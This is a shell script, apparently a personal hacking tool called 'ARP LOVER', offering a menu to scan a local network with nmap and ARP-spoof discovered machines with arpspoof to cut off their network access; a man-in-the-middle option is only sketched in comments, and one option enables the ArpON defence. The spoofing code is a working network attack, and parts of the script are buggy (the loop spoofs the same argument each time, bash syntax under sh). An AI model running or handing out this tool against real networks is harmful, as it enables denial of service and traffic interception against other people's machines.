#!/bin/sh

##########################
#
#
#
#
#
#
#
#########################

IPs=()



# Correction (ReArping)

Gateway=$(ip route show default dev wlan0 | awk '{print $3}' | tail -n 1 )

printf "\e[37;41m╔═══════════════════════════════════════════════════════════════════════════╗ \033[0m\n"
printf "\e[37;41m║                                                                           ║ \033[0m\n"
printf "\e[37;41m║    █████╗ ██████╗ ██████╗     ██╗      ██████╗ ██╗   ██╗███████╗██████╗   ║ \033[0m\n"
printf "\e[37;41m║   ██╔══██╗██╔══██╗██╔══██╗    ██║     ██╔═══██╗██║   ██║██╔════╝██╔══██╗  ║ \033[0m\n"
printf "\e[37;41m║   ███████║██████╔╝██████╔╝    ██║     ██║   ██║██║   ██║█████╗  ██████╔╝  ║ \033[0m\n"
printf "\e[37;41m║   ██╔══██║██╔══██╗██╔═══╝     ██║     ██║   ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗  ║ \033[0m\n"
printf "\e[37;41m║   ██║  ██║██║  ██║██║         ███████╗╚██████╔╝ ╚████╔╝ ███████╗██║  ██║  ║ \033[0m\n"
printf "\e[37;41m║   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝         ╚══════╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝  ║ \033[0m\n"
printf "\e[37;41m║                                                                           ║ \033[0m\n"
printf "\e[37;41m╠═════════════════════════ BERCHIL Idriss ══════════════════════════════════╝ \033[0m\n"
printf "║\n"
#TODO: if $1 is a host (not network) disable this option and auto configure
printf "╠═  1. Scan for available machine within your network (ARP Scan)\n"
#TODO: Not allow 2nd & 3rd option without scanning first
printf "╠═  2. Kill Network Access for scanned machines (ARP Spoof target only)\n"
printf "╠═  3. Man In the Middle (ARP Spoof target & gateway)\n"
printf "╠═  4. List Scanned machines (not implemented)\n"
printf "╠═  5. Protect yourself using ArpON\n"
printf "╚═  6. Exit\n"
printf "\n"
printf "╔═ 	Gateway is ${Gateway}, \n"
printf "╠═ 	Target is $1. \n"
printf "╚═ 	Interface is $2, \n"



while true 
do
	printf "\n\n> "
	read -e choice
	case ${choice} in
	1)
		echo "Scanning ..."
		Targets=$(sudo nmap -sn $1 --exclude ${Gateway} 2>/dev/null -oG - | grep "Up$" | awk '{printf "%s ", $2}')
		
		if [[ ! ${#Targets[@]} -eq 0 ]]
		then
			echo "Targets are:"
			for i in $Targets
			do
				echo $i
			done
		else
			echo "No Targets found."
		fi
		;;

	2)
		if [[ ${#Targets[@]} -eq 0 ]]
		then
			printf "No targets "
		fi

		for i in $Targets
		do
			printf "Spoofing " $i "..."
			xterm -hold -e "sudo arpspoof -t $1 -i $2 -c own ${Gateway}" 1>/dev/null 2>&1 &
			IPs+=$!
		done
		;;

	3)
	#Arp spoof target
	#ARp spoof gateway as target
	#open wireshark

	;;

	4)


	;;

	5)
		printf "Running Arpon ...\n"
		sudo arpon -D -d -i $2
		printf "Arpon has been enabled as background daemon.\n"
		;;
		
	6)
		if [[ ! ${#IPs[@]} -eq 0 ]] then
			printf "Rearping...\n"
		fi

		for i in $IPs 
		do
			kill -SIGINT $i
			sleep 3
			sudo kill -SIGKILL $i
		done

		printf "Exiting ...\n"	
		exit 0
		;;
		
	esac
done



